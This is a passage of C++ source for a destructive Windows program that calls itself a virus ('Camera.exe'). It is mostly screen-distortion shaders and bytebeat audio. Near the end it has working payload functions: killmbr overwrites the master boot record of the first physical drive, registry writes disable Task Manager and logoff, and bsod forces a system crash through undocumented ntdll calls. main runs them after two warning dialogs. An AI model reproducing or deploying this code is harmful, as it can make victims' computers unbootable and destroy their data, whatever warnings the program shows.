    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    for (;;) {
        SetPixelV(hdc, rand() % w, rand() % h, RGB(rand() % 255, rand() % 255, rand() % 255));
        Sleep(5);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI shader5(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    for (;;)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                int Xii = x * x + i;
                int Yii = y * y + i;
                int fx = (int)((i ^ 4) + (i * 4) * (Xii - i | Yii - i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader6(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    for (;;)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                double fractalX = (2.5f / w);
                double fractalY = (1.90f / h);
                double cx = x * fractalX - 2.f;
                double cy = y * fractalY - 0.95f;
                double zx = 0;
                double zy = 0;
                int fx = 0;
                while (((zx * zx) + (zy * zy)) < 10 && fx < 50)
                {
                    double fczx = zx * zx - zy * zy + cx;
                    double fczy = 2 * zx * zy + cy;
                    zx = fczx;
                    zy = fczy;
                    fx++;
                    rgbquadCopy = rgbquad[index];
                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                    hslcolor.s = 0.7f;
                    hslcolor.l = 0.5f;
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader3(LPVOID lpvd)
{
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    for (;;)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;
                int fx = i | (i * (x | y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen);
        DeleteDC(hdcScreen);
        Sleep(50);
    }
}

DWORD WINAPI fenlie(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    for (;;) {
        StretchBlt(hdc, -rand() % w / 10, 0, w, h / 10, hdc, 0, 0, w, h / 10, SRCCOPY);
        StretchBlt(hdc, rand() % w / 10, h / 10, w, h / 10, hdc, 0, h / 10, w, h / 10, SRCCOPY);
        StretchBlt(hdc, -rand() % w / 10, h / 5, w, h / 10, hdc, 0, h / 5, w, h / 10, SRCCOPY);
        StretchBlt(hdc, rand() % w / 10, h / 10 * 3, w, h / 10, hdc, 0, h / 10 * 3, w, h / 10, SRCCOPY);
        StretchBlt(hdc, -rand() % w / 10, h / 5 * 2, w, h / 10, hdc, 0, h / 5 * 2, w, h / 10, SRCCOPY);
        StretchBlt(hdc, rand() % w / 10, h / 2, w, h / 10, hdc, 0, h / 2, w, h / 10, SRCCOPY);
        StretchBlt(hdc, -rand() % w / 10, h / 5 * 3, w, h / 10, hdc, 0, h / 5 * 3, w, h / 10, SRCCOPY);
        StretchBlt(hdc, rand() % w / 10, h / 10 * 7, w, h / 10, hdc, 0, h / 10 * 7, w, h / 10, SRCCOPY);
        StretchBlt(hdc, -rand() % w / 10, h / 5 * 4, w, h / 10, hdc, 0, h / 5 * 4, w, h / 10, SRCCOPY);
        StretchBlt(hdc, rand() % w / 10, h / 10 * 9, w, h / 10, hdc, 0, h / 10 * 9, w, h / 10, SRCCOPY);
        Sleep(50);
    }
}

DWORD WINAPI fenlie2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    for (;;) {
        StretchBlt(hdc, 0, -rand() % h / 10, w / 10, h, hdc, 0, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 10, rand() % h / 10, w / 10, h, hdc, w / 10, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 5, -rand() % h / 10, w / 10, h, hdc, w / 5, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 10 * 3, rand() % h / 10, w / 10, h, hdc, w / 10 * 3, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 5 * 2, -rand() % h / 10, w / 10, h, hdc, w / 5 * 2, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 2, rand() % h / 10, w / 10, h, hdc, w / 2, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 5 * 3, -rand() % h / 10, w / 10, h, hdc, w / 5 * 3, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 10 * 7, rand() % h / 10, w / 10, h, hdc, w / 10 * 7, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 5 * 4, -rand() % h / 10, w / 10, h, hdc, w / 5 * 4, 0, w / 10, h, SRCCOPY);
        StretchBlt(hdc, w / 10 * 9, rand() % h / 10, w / 10, h, hdc, w / 10 * 9, 0, w / 10, h, SRCCOPY);
        Sleep(50);
    }
}

DWORD WINAPI Fault(LPVOID lpParam) {
    HDC DC = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int wdpi = GetDeviceCaps(DC, LOGPIXELSX);
    int hdpi = GetDeviceCaps(DC, LOGPIXELSY);
    for (;;)
    {
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, ((rand() % 3) - 1) * wdpi / 96, ((rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCAND);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
        BitBlt(DC, (-(rand() % 3) - 1) * wdpi / 96, (-(rand() % 3) - 1) * hdpi / 96, w, h, DC, 0, 0, SRCPAINT);
        Sleep(100);
    }
    return 0;
}

DWORD WINAPI sierpinskicube(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
    int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
    for (;;)
    {
        StretchBlt(hdc, 0, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, w / 3, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, w / 3 * 2, 0, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 0, h / 3, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, w / 3 * 2, h / 3, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 0, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, w / 3, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, w / 3 * 2, h / 3 * 2, w / 3, h / 3, hdc, 0, 0, w, h, SRCCOPY);
        Sleep(100);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 5 & (t << 3) + 12 * t * (t >> 13 | (t >> 1 | t >> 10 | t >> 2) & t >> 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t << 5 | t >> 5) | (t >> 5) + 5);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 4 | t >> 8) | t >> 8 ^ t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t >> 10 * t & t >> 5);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t << t * (t >> 10) * (t >> 7 | t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 | t | t >> 9 | t >> 13));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 8 | t | t >> 9 | t >> 13)) | (t * (1 + (1 & t >> 666)) * (2 + (t >> 1 & 1 ? (999999 ^ 888888 & t >> 66) / 5 : 3 & (t >> 13) + 1)) >> (666 & t >> 666)) & (t & 2048 ? (t * (t ^ t % 9) | t >> 1) >> 2 : 255);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (1 * t >> 1 ^ 45 * t >> 14));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 12) % 6 * t | -t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & -t >> (t & 0 ? 2 : 15)) | t >> (t & 0 ? 4096 ? 4 : 5 : 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

void disabletaskmgr()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
    RegSetValueEx(hkey, L"DisableTaskMgr", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

void nologoff()
{
    HKEY hkey;
    DWORD value = 1;
    RegCreateKey(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", &hkey);
    RegSetValueEx(hkey, L"NoLogOff", NULL, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
    RegCloseKey(hkey);
}

int killmbr()
{
    BYTE pmbr[4096] = { 0 };
    DWORD write;
    HANDLE mbr;
    char mbrdata[mbrsize] = boot;
    memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
    pmbr[510] = 0x55;
    pmbr[511] = 0xAA;
    mbr = CreateFile
    (
        L"\\\\.\\PHYSICALDRIVE0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
    {
    }
    else
    {
    }
    CloseHandle(mbr);
    return EXIT_SUCCESS;
}

void bsod() {
    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
    ExitProcess(0);
}

int main() {
    InitDPI();
    CREATE_NO_WINDOW;
    if (MessageBoxW(NULL, L"Warning! This program is a computer virus. It may make your computer cannot work normally. Whether to run or not?\r\n\r\n\
Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the 'No' button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the 'Yes' button to continue.", L"Camera.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\r\n\
Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus isn't responsible!!!", L"Camera.exe", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            killmbr();
            disabletaskmgr();
            nologoff();
            sound1();
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread1, 0);
            InvalidateRect(0, 0, 0);
            sound2();
            HANDLE thread2 = CreateThread(0, 0, camera, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, tesseract, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread2, 0);
            InvalidateRect(0, 0, 0);
            sound3();
            HANDLE thread4 = CreateThread(0, 0, mohu, 0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, text, 0, 0, 0);
            HANDLE thread6 = CreateThread(0, 0, text2, 0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, colorfang, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread4, 0);
            TerminateThread(thread5, 0);
            TerminateThread(thread6, 0);
            TerminateThread(thread7, 0);
            InvalidateRect(0, 0, 0);
            sound4();
            HANDLE thread8 = CreateThread(0, 0, smallicon, 0, 0, 0);
            HANDLE thread9 = CreateThread(0, 0, smallinvert, 0, 0, 0);
            HANDLE thread10 = CreateThread(0, 0, smallcolor, 0, 0, 0);
            HANDLE thread11 = CreateThread(0, 0, smallsquare, 0, 0, 0);
            HANDLE thread12 = CreateThread(0, 0, silie, 0, 0, 0);
            HANDLE thread13 = CreateThread(0, 0, doudong, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread8, 0);
            TerminateThread(thread9, 0);
            TerminateThread(thread10, 0);
            TerminateThread(thread11, 0);
            TerminateThread(thread12, 0);
            TerminateThread(thread13, 0);
            TerminateThread(thread3, 0);
            InvalidateRect(0, 0, 0);
            sound5();
            HANDLE thread14 = CreateThread(0, 0, mixblt, 0, 0, 0);
